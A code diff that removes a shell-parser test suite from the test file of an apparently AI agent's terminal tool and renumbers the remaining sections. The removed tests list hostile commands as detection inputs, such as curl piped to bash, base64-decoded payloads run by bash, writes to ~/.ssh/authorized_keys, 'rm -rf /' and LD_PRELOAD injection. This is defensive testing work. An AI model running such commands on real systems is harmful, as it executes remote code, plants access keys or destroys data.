@@ -65,7 +65,6 @@ mock.module("../tools/network/script-proxy/index.js", () => ({
 
 // ── Imports (after mocks) ───────────────────────────────────────────────────
 
-import { parse } from "../tools/terminal/parser.js";
 import {
   ALWAYS_INJECTED_ENV_VARS,
   buildSanitizedEnv,
@@ -76,307 +75,7 @@ import { wrapCommand } from "../tools/terminal/sandbox.js";
 import { ToolError } from "../util/errors.js";
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  1. Shell Parser — parse()
-// ═══════════════════════════════════════════════════════════════════════════
-
-describe("Shell parser", () => {
-  // ── Basic segment extraction ──────────────────────────────────────────
-
-  describe("segment extraction", () => {
-    test("simple command", async () => {
-      const result = await parse("ls -la");
-      expect(result.segments.length).toBe(1);
-      expect(result.segments[0].program).toBe("ls");
-      expect(result.segments[0].args).toContain("-la");
-      expect(result.segments[0].operator).toBe("");
-    });
-
-    test("command with multiple arguments", async () => {
-      const result = await parse('git commit -m "initial commit"');
-      expect(result.segments.length).toBe(1);
-      expect(result.segments[0].program).toBe("git");
-      expect(result.segments[0].args).toContain("commit");
-      expect(result.segments[0].args).toContain("-m");
-    });
-
-    test("compound command with &&", async () => {
-      const result = await parse("mkdir foo && cd foo");
-      expect(result.segments.length).toBe(2);
-      expect(result.segments[0].program).toBe("mkdir");
-      expect(result.segments[0].operator).toBe("");
-      expect(result.segments[1].program).toBe("cd");
-      expect(result.segments[1].operator).toBe("&&");
-    });
-
-    test("compound command with ||", async () => {
-      const result = await parse("test -f foo || echo missing");
-      expect(result.segments.length).toBe(2);
-      expect(result.segments[1].operator).toBe("||");
-      expect(result.segments[1].program).toBe("echo");
-    });
-
-    test("compound command with semicolons", async () => {
-      const result = await parse("echo a; echo b; echo c");
-      expect(result.segments.length).toBe(3);
-      // tree-sitter parses semicolons as list separators; the parser resets
-      // operator to '' after each child, so the second/third segments may
-      // carry ';' or '' depending on the tree-sitter-bash grammar version.
-      // The key invariant is that we get 3 segments.
-      const programs = result.segments.map((s) => s.program);
-      expect(programs).toEqual(["echo", "echo", "echo"]);
-    });
-
-    test("pipeline", async () => {
-      const result = await parse("cat file.txt | grep pattern | wc -l");
-      expect(result.segments.length).toBe(3);
-      expect(result.segments[0].program).toBe("cat");
-      expect(result.segments[0].operator).toBe("");
-      expect(result.segments[1].program).toBe("grep");
-      expect(result.segments[1].operator).toBe("|");
-      expect(result.segments[2].program).toBe("wc");
-      expect(result.segments[2].operator).toBe("|");
-    });
-
-    test("pipeline combined with &&", async () => {
-      const result = await parse("ls | wc -l && echo done");
-      expect(result.segments.length).toBe(3);
-      expect(result.segments[0].operator).toBe("");
-      expect(result.segments[1].operator).toBe("|");
-      expect(result.segments[2].operator).toBe("&&");
-    });
-
-    test("redirected statement extracts command from inside", async () => {
-      const result = await parse("echo hello > output.txt");
-      expect(result.segments.length).toBe(1);
-      expect(result.segments[0].program).toBe("echo");
-    });
-
-    test("subshell extracts inner commands", async () => {
-      const result = await parse("(echo hello && echo world)");
-      expect(result.segments.length).toBe(2);
-      expect(result.segments[0].program).toBe("echo");
-      expect(result.segments[1].program).toBe("echo");
-    });
-
-    test("empty command produces no segments", async () => {
-      const result = await parse("");
-      expect(result.segments.length).toBe(0);
-    });
-
-    test("for loop extracts body commands", async () => {
-      const result = await parse("for i in a b c; do echo $i; done");
-      expect(result.segments.length).toBeGreaterThanOrEqual(1);
-      const programs = result.segments.map((s) => s.program);
-      expect(programs).toContain("echo");
-    });
-
-    test("if statement extracts body commands", async () => {
-      const result = await parse("if true; then echo yes; fi");
-      expect(result.segments.length).toBeGreaterThanOrEqual(1);
-      const programs = result.segments.map((s) => s.program);
-      expect(programs).toContain("echo");
-    });
-
-    test("command with string arguments", async () => {
-      const result = await parse("echo 'single quoted' \"double quoted\"");
-      expect(result.segments.length).toBe(1);
-      expect(result.segments[0].program).toBe("echo");
-    });
-  });
-
-  // ── Dangerous pattern detection ───────────────────────────────────────
-
-  describe("dangerous patterns", () => {
-    test("pipe to bash detected", async () => {
-      const result = await parse("curl http://example.com | bash");
-      expect(result.dangerousPatterns.length).toBeGreaterThanOrEqual(1);
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("pipe_to_shell");
-    });
-
-    test("pipe to sh detected", async () => {
-      const result = await parse("cat script.sh | sh");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("pipe_to_shell");
-    });
-
-    test("pipe to zsh detected", async () => {
-      const result = await parse('echo "code" | zsh');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("pipe_to_shell");
-    });
-
-    test("pipe to eval detected", async () => {
-      const result = await parse('echo "echo hi" | eval');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("pipe_to_shell");
-    });
-
-    test("pipe to xargs detected", async () => {
-      const result = await parse('find . -name "*.tmp" | xargs rm');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("pipe_to_shell");
-    });
-
-    test("pipe to grep is not flagged as pipe_to_shell", async () => {
-      const result = await parse("cat file | grep pattern");
-      const pipeToShell = result.dangerousPatterns.filter(
-        (p) => p.type === "pipe_to_shell",
-      );
-      expect(pipeToShell.length).toBe(0);
-    });
-
-    test("base64 decode piped to bash detected", async () => {
-      const result = await parse("echo payload | base64 -d | bash");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("base64_execute");
-    });
-
-    test("redirect to sensitive path ~/.ssh/ detected", async () => {
-      const result = await parse("echo key > ~/.ssh/authorized_keys");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("sensitive_redirect");
-    });
-
-    test("redirect to sensitive path ~/.bashrc detected", async () => {
-      const result = await parse('echo "export FOO=bar" >> ~/.bashrc');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("sensitive_redirect");
-    });
-
-    test("redirect to /etc/ detected", async () => {
-      const result = await parse(
-        'echo "nameserver 8.8.8.8" > /etc/resolv.conf',
-      );
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("sensitive_redirect");
-    });
-
-    test("redirect to normal path is not flagged", async () => {
-      const result = await parse("echo hello > /tmp/output.txt");
-      const sensitive = result.dangerousPatterns.filter(
-        (p) => p.type === "sensitive_redirect",
-      );
-      expect(sensitive.length).toBe(0);
-    });
-
-    test("command substitution as argument to rm detected", async () => {
-      const result = await parse('rm $(find . -name "*.tmp")');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("dangerous_substitution");
-    });
-
-    test("command substitution as argument to chmod detected", async () => {
-      const result = await parse("chmod $(cat perms) file");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("dangerous_substitution");
-    });
-
-    test("assignment to PATH detected as env_injection", async () => {
-      const result = await parse("PATH=/evil:$PATH ls");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("env_injection");
-    });
-
-    test("assignment to LD_PRELOAD detected as env_injection", async () => {
-      const result = await parse("LD_PRELOAD=/evil/lib.so cmd");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("env_injection");
-    });
-
-    test("assignment to NODE_OPTIONS detected as env_injection", async () => {
-      const result = await parse('NODE_OPTIONS="--require=evil" node');
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("env_injection");
-    });
-
-    test("assignment to harmless variable is not flagged", async () => {
-      const result = await parse("FOO=bar echo hello");
-      const envInjection = result.dangerousPatterns.filter(
-        (p) => p.type === "env_injection",
-      );
-      expect(envInjection.length).toBe(0);
-    });
-
-    test("process substitution detected", async () => {
-      const result = await parse("diff <(sort a.txt) <(sort b.txt)");
-      const types = result.dangerousPatterns.map((p) => p.type);
-      expect(types).toContain("process_substitution");
-    });
-  });
-
-  // ── Opaque construct detection ────────────────────────────────────────
-
-  describe("opaque constructs", () => {
-    test("eval is opaque", async () => {
-      const result = await parse('eval "echo hello"');
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("source is opaque", async () => {
-      const result = await parse("source ~/.bashrc");
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("dot-source is opaque", async () => {
-      const result = await parse(". ~/.profile");
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("bash -c is opaque", async () => {
-      const result = await parse('bash -c "echo hello"');
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("sh -c is opaque", async () => {
-      const result = await parse('sh -c "rm -rf /"');
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("zsh -c is opaque", async () => {
-      const result = await parse('zsh -c "echo hi"');
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("bash -ec is opaque", async () => {
-      const result = await parse('bash -ec "echo careful"');
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("heredoc is opaque", async () => {
-      const result = await parse("cat <<EOF\nhello world\nEOF");
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("variable expansion as command is opaque", async () => {
-      const result = await parse("$CMD arg1 arg2");
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("command substitution as command is opaque", async () => {
-      const result = await parse("$(get_cmd) arg1 arg2");
-      expect(result.hasOpaqueConstructs).toBe(true);
-    });
-
-    test("simple command is not opaque", async () => {
-      const result = await parse("ls -la /tmp");
-      expect(result.hasOpaqueConstructs).toBe(false);
-    });
-
-    test("pipeline of safe commands is not opaque", async () => {
-      const result = await parse("cat file | grep pattern | wc -l");
-      expect(result.hasOpaqueConstructs).toBe(false);
-    });
-
-    test("compound safe commands are not opaque", async () => {
-      const result = await parse("mkdir foo && cd foo && touch bar");
-      expect(result.hasOpaqueConstructs).toBe(false);
-    });
-  });
-});
-
-// ═══════════════════════════════════════════════════════════════════════════
-//  2. Safe Environment — buildSanitizedEnv()
+//  Safe Environment — buildSanitizedEnv()
 // ═══════════════════════════════════════════════════════════════════════════
 
 describe("buildSanitizedEnv", () => {
@@ -482,7 +181,7 @@ describe("buildSanitizedEnv", () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  3. Sandbox wrapCommand
+//  Sandbox wrapCommand
 // ═══════════════════════════════════════════════════════════════════════════
 
 describe("wrapCommand", () => {
@@ -512,7 +211,7 @@ describe("wrapCommand", () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  4. Native sandbox backend — path safety
+//  Native sandbox backend — path safety
 // ═══════════════════════════════════════════════════════════════════════════
 
 describe("Native sandbox backend", () => {
@@ -567,7 +266,7 @@ describe("Native sandbox backend", () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  5. Shell tool — input validation
+//  Shell tool — input validation
 // ═══════════════════════════════════════════════════════════════════════════
 
 describe("Shell tool input validation", () => {
@@ -665,7 +364,7 @@ describe("Shell tool input validation", () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  7. Shell output formatting
+//  Shell output formatting
 // ═══════════════════════════════════════════════════════════════════════════
 
 describe("formatShellOutput", () => {
